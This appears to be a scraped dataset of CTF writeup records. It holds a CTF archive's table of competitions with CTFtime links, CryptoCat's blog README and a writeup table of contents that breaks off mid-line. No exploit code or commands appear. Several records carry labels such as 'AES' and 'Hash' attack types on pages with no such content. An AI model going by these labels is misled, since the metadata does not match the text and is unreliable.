<td><a href=\"ctfs/b01lers/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2652/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/b01lers/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2250/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/b01lers/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1875/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/b01lers/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1583/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/b01lers/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1259/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/b01lers/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/974/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/bi0sCTF\">bi0sCTF</a></td>\n            <td><a href=\"ctfs/bi0sCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2672/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/bi0sCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2117/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/boot2root\">b00t2root</a></td>\n            <td><a href=\"ctfs/boot2root/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1202/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/castorsCTF\">castors</a></td>\n            <td><a href=\"ctfs/castorsCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1063/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/cornCTF\">cornCTF</a></td>\n            <td><a href=\"ctfs/cornCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2762/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/corCTF\">corCTF</a></td>\n            <td><a href=\"ctfs/corCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2763/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/corCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1928/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/corCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1656/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/corCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1364/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/cr3\">cr3</a></td>\n            <td><a href=\"ctfs/cr3/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2288/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/cruXipher\">cruXipher</a></td>\n            <td><a href=\"ctfs/cruXipher/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2559/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/csictf\">csictf</a></td>\n            <td><a href=\"ctfs/csictf/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1081/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/darkCON\">darkCON</a></td>\n            <td><a href=\"ctfs/darkCON/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1250/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/eHaCON\">eHaCON</a></td>\n            <td><a href=\"ctfs/eHaCON/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1494/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/iCTF\">UCSB iCTF</a></td>\n            <td><a href=\"ctfs/iCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/567/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/iCTF/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/idekCTF\">idekCTF</a></td>\n            <td><a href=\"ctfs/idekCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2746/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/idekCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2304/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/idekCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1839/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/idekCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1512/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/jailCTF\">jailCTF</a></td>\n            <td><a href=\"ctfs/jailCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2737/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/jailCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2450/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/justCTF\">justCTF</a></td>\n            <td><a href=\"ctfs/justCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2711/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/justCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2342/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/justCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1930/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/justCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1631/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/justCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1050/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/justCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/943/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/kksctf\">#kksctf</a></td>\n            <td><a href=\"ctfs/kksctf/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1112/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/kksctf/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/874/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=9><a href=\"ctfs/m0leCon\">m0leCon</a></td>\n            <td><a href=\"ctfs/m0leCon/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2946/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2025/Beginner\">2025 Beginner</a></td>\n            <td><a href=\"https://ctftime.org/event/2578/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2440/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1898/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2022/Beginner\">2022 Beginner</a></td>\n            <td><a href=\"https://ctftime.org/event/1813/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2022/Quals\">2022 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1615/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1325/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2020/Finals\">2020 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/1135/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/m0leCon/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1025/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/n00bzCTF\">n00bzCTF</a></td>\n            <td><a href=\"ctfs/n00bzCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2378/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/n00bzCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1895/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/nullconHackIM\">nullconHackIM</a></td>\n            <td><a href=\"ctfs/nullconHackIM/2025-Berlin\">2025 Berlin</a></td>\n            <td><a href=\"https://ctftime.org/event/2874/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/nullconHackIM/2023-Goa\">2023 Goa</a></td>\n            <td><a href=\"https://ctftime.org/event/2065/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/nullconHackIM/2023-Berlin\">2023 Berlin</a></td>\n            <td><a href=\"https://ctftime.org/event/1900/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/nullconHackIM/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1718/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/nullconHackIM/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/741/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/nullconHackIM/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/566/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/NullconHackIM/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/openECSC\">openECSC</a></td>\n            <td><a href=\"ctfs/openECSC/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2940/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/openECSC/2024-round3\">2024-round3</a></td>\n            <td><a href=\"https://ctftime.org/event/2355/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/openECSC/2024-round2\">2024-round2</a></td>\n            <td><a href=\"https://ctftime.org/event/2354/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/openECSC/2024-round1\">2024-round1</a></td>\n            <td><a href=\"https://ctftime.org/event/2305/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/osuigaming\">osu!gaming</a></td>\n            <td><a href=\"ctfs/osuigaming/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2801/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/osuigaming/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/998/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/p4ctf\">p4ctf</a></td>\n            <td><a href=\"ctfs/p4ctf/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1976/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/p4ctf/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1793/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/pbctf\">perfect blue</a></td>\n            <td><a href=\"ctfs/pbctf/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1763/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/pbctf/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1371/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/pbctf/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1121/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/pingCTF\">pingCTF</a></td>\n            <td><a href=\"ctfs/pingCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2670/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/pingCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1987/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/pingCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1769/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/redpwn\">redpwn</a></td>\n            <td><a href=\"ctfs/redpwn/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1706/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/redpwn/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1327/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/redpwn\">redpwn</a></td>\n            <td><a href=\"ctfs/redpwn/2020\">2020</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/rgbCTF\">rgbCTF</a></td>\n            <td><a href=\"ctfs/rgbCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1042/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/scriptCTF\">scriptCTF</a></td>\n            <td><a href=\"ctfs/scriptCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2792/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/smileyCTF\">smileyCTF</a></td>\n            <td><a href=\"ctfs/smileyCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2591/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/snakeCTF\">snakeCTF</a></td>\n            <td><a href=\"ctfs/snakeCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2418/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/snakeCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2158/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/squ1rrel\">squ1rrel</a></td>\n            <td><a href=\"ctfs/squ1rrel/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2708/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/squ1rrel/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2370/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/vikeCTF\">vikeCTF</a></td>\n            <td><a href=\"ctfs/vikeCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2263/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/VishwaCTF\">VishwaCTF</a></td>\n            <td><a href=\"ctfs/VishwaCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2630/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VishwaCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1904/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VishwaCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1548/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VishwaCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1286/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/vsCTF\">vsCTF</a></td>\n            <td><a href=\"ctfs/vsCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2248/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/vsCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2053/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/vsCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1658/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/watevrCTF\">watevr</a></td>\n            <td><a href=\"ctfs/watevrCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/893/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/wtf\">wtf</a></td>\n            <td><a href=\"ctfs/wtf/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1589/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/wtf/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1373/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/x3ctf\">x3ctf</a></td>\n            <td><a href=\"ctfs/x3ctf/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2467/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/zer0pts\">zer0pts</a></td>\n            <td><a href=\"ctfs/zer0pts/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1972/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/zer0pts/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1555/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/zer0pts/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1256/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/zer0pts/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1006/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n    </tbody>\n</table>\n", "solution_code": "", "url": "https://github.com/sajjadium/ctf-archives/blob/main/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:40.473876", "synthetic": false}
{"id": "crypto-cat_ctf-writeups_d1e70d57314c", "team": "crypto-cat", "event": "ctf-writeups", "challenge_name": "README", "challenge_description": "---\ndescription: CryptoCat's blog - CTF writeups, vulnerability research, bug bounty reports 💜\n---\n\n# CryptoCat's Blog\n\n-   🚩 **[CTF Writeups](ctf/README.md)**  \n    Challenge writeups, solve scripts, and video walkthroughs from CTFs I’ve played.\n\n-   🔬 **[Vulnerability Research](research/README.md)**  \n    CVE analysis, patch diffing, reverse engineering, exploit development, and proof of concepts.\n\n---\n\n### 📚 Want to practice?\n\nCheck out [my favourite free hacking resources](https://cryptocat....", "attack_type": "AES", "tools_used": [], "difficulty": "unknown", "writeup": "---\ndescription: CryptoCat's blog - CTF writeups, vulnerability research, bug bounty reports 💜\n---\n\n# CryptoCat's Blog\n\n-   🚩 **[CTF Writeups](ctf/README.md)**  \n    Challenge writeups, solve scripts, and video walkthroughs from CTFs I’ve played.\n\n-   🔬 **[Vulnerability Research](research/README.md)**  \n    CVE analysis, patch diffing, reverse engineering, exploit development, and proof of concepts.\n\n---\n\n### 📚 Want to practice?\n\nCheck out [my favourite free hacking resources](https://cryptocat.me/resources) 😎\n\n### 🎥 Prefer videos?\n\nI've got my own [Video Search Tool](https://cryptocat.me/videos)!\n\n[![VIDEO](https://img.youtube.com/vi/jUjlj2z5jJk/0.jpg)](https://youtube.com/@_CryptoCat)\n\n#### Playlists\n\n-   [CTF Walkthroughs](https://www.youtube.com/playlist?list=PLHUKi1UlEgOLEfaxrnUFUgDPHI6VKf2RK)\n-   [Intro to Binary Exploitation](https://www.youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94)\n-   [ROP Emporium](https://www.youtube.com/playlist?list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu)\n-   [Damn Vulnerable Web Application](https://www.youtube.com/playlist?list=PLHUKi1UlEgOJLPSFZaFKMoexpM6qhOb4Q)\n-   [HackTheBox: Starting Point](https://www.youtube.com/playlist?list=PLHUKi1UlEgOINz5PLYb9yu7evQZ_5MQ21)\n-   [HackTheBox: Challenges](https://www.youtube.com/playlist?list=PLHUKi1UlEgOIn12nvhwwq2aTU8bG-FE0I)\n-   [HackTheBox: Battlegrounds](https://www.youtube.com/playlist?list=PLHUKi1UlEgOInuxpRQUk5mQSJwmy2h278)\n-   [Cyber-Security Certifications](https://www.youtube.com/playlist?list=PLHUKi1UlEgOL4fwv44vGDM5pRz47RRJxL)\n\n---\n\n💬 Questions? Join my [Discord server](https://discord.cryptocat.me) 🥰\n", "solution_code": "", "url": "https://github.com/Crypto-Cat/cryptocat-gitbook/blob/main/README.md", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:00:43.444296", "synthetic": false}
{"id": "crypto-cat_ctf-writeups_38da317a9153", "team": "crypto-cat", "event": "ctf-writeups", "challenge_name": "SUMMARY", "challenge_description": "# Table of contents\n\n-   [Home](README.md)\n-   [CTF Writeups](ctf/README.md)\n    -   [Monthly Challenges](ctf/monthly/README.md)\n        -   [YesWeHack](ctf/monthly/ywh/)\n            -   [08-25: Hardware Monitor](ctf/monthly/ywh/0825/hardware_monitor.md)\n            -   [07-25: CCTV Manager](ctf/monthly/ywh/0725/cctv_manager.md)\n            -   [06-25: Hex Color Palette](ctf/monthly/ywh/0625/hex_color_palette.md)\n        -   [Intigriti](ctf/monthly/intigriti/)\n            -   [04-25: HackDonalds...", "attack_type": "Hash", "tools_used": [], "difficulty": "unknown", "writeup": "# Table of contents\n\n-   [Home](README.md)\n-   [CTF Writeups](ctf/README.md)\n    -   [Monthly Challenges](ctf/monthly/README.md)\n        -   [YesWeHack](ctf/monthly/ywh/)\n            -   [08-25: Hardware Monitor](ctf/monthly/ywh/0825/hardware_monitor.md)\n            -   [07-25: CCTV Manager](ctf/monthly/ywh/0725/cctv_manager.md)\n            -   [06-25: Hex Color Palette](ctf/monthly/ywh/0625/hex_color_palette.md)\n        -   [Intigriti](ctf/monthly/intigriti/)\n            -   [04-25: HackDonalds](ctf/monthly/intigriti/0425/hackdonalds.md)\n            -   [08-24: SafeNotes](ctf/monthly/intigriti/0824/safenotes.md)\n            -   [01-24: Repo Woes](ctf/monthly/intigriti/0124/repo_woes.md)\n            -   [04-23: We Like To Sell Bricks](ctf/monthly/intigriti/0423/we_like_to_sell_bricks.md)\n        -   [CryptoCat](ctf/monthly/cryptocat/)\n            -   [12-24: Summar-AI-ze](ctf/monthly/cryptocat/1224/summaraize.md)\n    -   [2025](ctf/2025/README.md)\n        -   [K17](ctf/2025/k17_25/)\n            -   [Rev](ctf/2025/k17_25/rev/)\n                -   [Secure Exam Browser](ctf/2025/k17_25/rev/secure_exam_browser/secure_exam_browser.md)\n                -   [Bait and Switch](ctf/2025/k17_25/rev/bait_and_switch/bait_and_switch.md)\n        -   [DefCamp](ctf/2025/defcamp_25/)\n            -   [Pwn](ctf/2025/defcamp_25/pwn/)\n                -   [Nulle](ctf/2025/defcamp_25/pwn/nulle/nulle.md)\n        -   [Imaginary](ctf/2025/imaginary_25/)\n            -   [Rev](ctf/2025/imaginary_25/rev/)\n                -   [Nimrod](ctf/2025/imaginary_25/rev/nimrod/nimrod.md)\n                -   [Comparing](ctf/2025/imaginary_25/rev/comparing/comparing.md)\n                -   [Weird App](ctf/2025/imaginary_25/rev/weird_app/weird_app.md)\n                -   [Stacked](ctf/2025/imaginary_25/rev/stacked/stacked.md)\n        -   [HackTheAgent](ctf/2025/hack_the_agent_25/)\n            -   [AI](ctf/2025/hack_the_agent_25/ai/)\n                -   [LLM Hacking (levels 1-5)](ctf/2025/hack_the_agent_25/ai/hack_the_agent.md)\n        -   [WHY](ctf/2025/why_25/)\n            -   [Web](ctf/2025/why_25/web/)\n                -   [Shoe Shop](ctf/2025/why_25/web/shoe_shop/shoe_shop.md)\n                -   [Planets](ctf/2025/why_25/web/planets/planets.md)\n                -   [Buster](ctf/2025/why_25/web/buster/buster.md)\n                -   [Why2025 CTF Time](ctf/2025/why_25/web/why2025_ctf_time/why2025_ctf_time.md)\n                -   [Why2025 Planner](ctf/2025/why_25/web/why2025_planner/why2025_planner.md)\n                -   [Fancy Login Form](ctf/2025/why_25/web/fancy_login_form/fancy_login_form.md)\n        -   [N0PS](ctf/2025/nops_25/)\n            -   [Web](ctf/2025/nops_25/web/)\n                -   [Press Me If U Can](ctf/2025/nops_25/web/press_me_if_you_can/press_me_if_you_can.md)\n        -   [NahamCon](ctf/2025/nahamcon_25/)\n            -   [Web](ctf/2025/nahamcon_25/web/)\n                -   [SNAD](ctf/2025/nahamcon_25/web/snad/snad.md)\n                -   [Infinite Queue](ctf/2025/nahamcon_25/web/infinite_queue/infinite_queue.md)\n                -   [TMCB](ctf/2025/nahamcon_25/web/tmcb/tmcb.md)\n                -   [Method in the Madness](ctf/2025/nahamcon_25/web/method_in_the_madness/method_in_madness.md)\n                -   [No Sequel](ctf/2025/nahamcon_25/web/no_sequel/no_sequel.md)\n                -   [Advanced Screening](ctf/2025/nahamcon_25/web/advanced_screening/advanced_screening.md)\n                -   [My First CTF](ctf/2025/nahamcon_25/web/my_first_ctf/my_first_ctf.md)\n                -   [My Second CTF](ctf/2025/nahamcon_25/web/my_second_ctf/my_second_ctf.md)\n                -   [My Third CTF](ctf/2025/nahamcon_25/web/my_third_ctf/my_third_ctf.md)\n                -   [The Mission](ctf/2025/nahamcon_25/web/the_mission/the_mission.md)\n        -   [Tsuku](ctf/2025/tsuku_25/)\n            -   [Web](ctf/2025/tsuku_25/web/)\n                -   [len_len](ctf/2025/tsuku_25/web/len_len/len_len.md)\n                -   [Flash](ctf/2025/tsuku_25/web/flash/flash.md)\n                -   [YAMLwaf](ctf/2025/tsuku_25/web/yamlwaf/yamlwaf.md)\n        -   [CTF@CIT](ctf/2025/cit_25/)\n            -   [Web](ctf/2025/cit_25/web/)\n                -   [Breaking Authentication](ctf/2025/cit_25/web/broken_authentication/broken_authentication.md)\n                -   [Commit & Order: Version Control Unit](ctf/2025/cit_25/web/commit_and_order/commit_and_order.md)\n                -   [How I Parsed your JSON](ctf/2025/cit_25/web/how_i_parsed_your_json/how_i_parsed_your_json.md)\n                -   [Mr. Chatbot](ctf/2025/cit_25/web/mr_chatbot/mr_chatbot.md)\n                -   [Keeping Up with the Credentials](ctf/2025/cit_25/web/keeping_up_with_credentials/keeping_up_with_credentials.md)\n    -   [2024](ctf/2024/README.md)\n        -   [Intigriti](ctf/2024/intigriti_24/)\n            -   [Warmup](ctf/2024/intigriti_24/warmup/)\n                -   [BabyFlow](ctf/2024/intigriti_24/warmup/babyflow/babyflow.md)\n                -   [In Plain 